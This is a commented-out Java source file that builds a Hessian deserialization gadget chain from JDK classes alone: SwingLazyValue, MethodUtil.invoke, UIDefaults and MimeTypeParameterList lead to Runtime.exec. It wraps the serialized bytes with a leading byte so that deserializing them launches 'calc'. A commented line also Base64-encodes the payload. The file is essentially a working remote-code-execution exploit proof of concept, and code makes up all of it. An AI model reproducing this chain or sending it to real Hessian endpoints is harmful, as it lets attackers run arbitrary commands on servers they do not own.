//package gadget.hessian;
//
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import com.caucho.hessian.io.*;
//import java.util.Base64;
//import sun.reflect.misc.MethodUtil;
//import javax.activation.MimeTypeParameterList;
//import java.io.*;
//import javax.swing.UIDefaults;
//import sun.swing.SwingLazyValue;
//import sun.reflect.misc.MethodUtil;
//public class onlyJDK {
//    public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException {
//        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil")
//                .getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
//        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
//        SwingLazyValue slz = new
//                SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke",
//                new Object[]{
//                        invokeMethod,
//                        new Object(),
//                        new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}
//                });
//
//        UIDefaults uiDefaults = new UIDefaults();
//        uiDefaults.put("squirt1e", slz);
//
//        MimeTypeParameterList ml = new MimeTypeParameterList();
//        Field ps = ml.getClass().getDeclaredField("parameters");
//        ps.setAccessible(true);
//        ps.set(ml, uiDefaults);
//
//        byte[] result;
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        Hessian2Output oo = new Hessian2Output(bos);
//        oo.getSerializerFactory().setAllowNonSerializable(true);
//        oo.writeObject(ml);
//        oo.flush();
//        result = bos.toByteArray();
//        byte[] wrapper = new byte[result.length + 1];
//        wrapper[0] = 67;
//        System.arraycopy(result, 0, wrapper, 1, result.length);
//
////        String Payload = Base64.getEncoder().encodeToString(result);
////        System.out.println(Payload);
//
//        ByteArrayInputStream bais = new ByteArrayInputStream(wrapper);
//        Hessian2Input input = new Hessian2Input(bais);
//        input.readObject();
//    }
//    public static void unser(){
//
//    }
//}
